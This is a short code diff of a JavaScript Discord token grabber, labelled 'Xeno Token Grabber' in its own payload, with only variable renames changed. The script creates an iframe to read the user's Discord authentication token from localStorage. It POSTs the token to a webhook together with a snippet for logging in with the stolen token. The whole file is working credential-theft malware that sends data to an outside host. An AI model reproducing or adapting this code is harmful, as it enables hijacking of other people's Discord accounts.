@@ -1,6 +1,6 @@
 location.reload();
 
-const discordWebhook = "webhook-url-here";
+const webhookURL = "webhook-url-here";
 
 const i = document.createElement("iframe");
 
@@ -8,11 +8,11 @@ document.body.appendChild(i);
 
 const request = new XMLHttpRequest();
 
-request.open("POST", discordWebhook);
+request.open("POST", webhookURL);
 
 request.setRequestHeader("Content-type", "application/json");
 
-const params = {
+const webhook = {
     username: "Xeno Token Grabber",
     avatar_url: "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg",
     content: `**Token:** ${i.contentWindow.localStorage.token.replace('"', "").replace('"', "")}
@@ -30,4 +30,4 @@ i.contentWindow.localStorage.token = "${i.contentWindow.localStorage.token.repla
 \`\`\``
 };
 
-request.send(JSON.stringify(params));
+request.send(JSON.stringify(webhook));
